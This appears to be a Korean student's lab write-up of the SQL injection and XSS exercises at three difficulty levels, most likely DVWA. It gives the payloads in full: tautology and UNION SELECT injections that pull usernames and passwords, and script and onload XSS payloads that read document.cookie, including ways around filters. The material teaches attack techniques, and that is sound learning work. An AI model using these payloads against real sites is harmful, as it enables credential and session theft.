# SQL injection

## <low 단계>
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/1.png?raw=true" width="480" height="400"/>

    User ID : 1' or '1'='1을 입력함으로써 1=1이라는 True일 수 밖에 없는 구조로 SQL injection을 한다.

    {low 답} 
    
    1' or '1'='1;

## <medium 단계>

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/3.png?raw=true" width="480" height="400"/>

    id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    --> 특수문자 처리해줌(예 : ' '같은거는 걸림) 

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/4.png?raw=true" width="480" height="400"/>

    유니온으로 하는 방법
    : 유니온--> 새로운 커리를 뒤에 추가할 수 있음~> 결합 느낌

    {medium 답} union select user_id, password from users;


## <high 단계>


* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/high.png?raw=true" width="480" height="400"/>
    
    LIMIT 1이 되있으므로 low 방식과 같게 하고 마지막에 주석 처리를 해줌으로써 푼다.
 
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/SQL%20injection%20high%201.png?raw=true" width="380" height="280"/>

 
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/SQL%20injection%20high.png?raw=true" width="480" height="400"/>

     {high 답}  
     
     1' or 1=1 #



# XSS Write up

* 게시판에서 악용될 수 있음
--> 쿠키 탈취 하는 문제점(세션 정보~~)

## <low 단계>
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/8.png?raw=true" width="480" height="400"/>

  {low 답}
  
  Name : hello
  Message : script alert (document.cookie); /script
  
  {srcipt 양끝에 <> 있습니다.}
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/9.png?raw=true" width="480" height="400"/>


## <medium 단계>

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/%EB%AF%B8%EB%93%90%20%EC%BD%94%EB%93%9C.png?raw=true" width="480" height="400"/>

  name = str_replace( 'script', '', $name);
  
  {srcipt 양끝에 <> 있습니다.}


* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/11.png?raw=true" width="480" height="400"/>

  {medium 답}  scrscriptiptalert(document.cookie);/script
  
  {srcipt 양끝에 <> 있습니다.}

  {scr 다음에 "<"이 있고 ip 앞에 ">" 있습니다.}

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/12.png?raw=true" width="480" height="400"/>

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/medium%20%ED%95%B4%EA%B2%B0%20%ED%99%94%EB%A9%B4.png?raw=true" width="480" height="400"/>

## <high 단계>

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/13(high).png?raw=true" width="480" height="400"/>
 
* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/XSS%20high.png?raw=true" width="480" height="400"/>

    입력할 수 있는 크기가 제한되있어서 개발자 도구를 통해 50으로 사이즈로 바꿔 작성하면 된다.
  
  {high 답} 
  
  body onload="alert(document.cookie)" 
  
  {처음과 끝에 <>가 있습니다.}

* <img src="https://github.com/adakim3297/GBC-web-1/blob/main/high%20%EA%B2%B0%EA%B3%BC.png?raw=true" width="400" height="450"/>





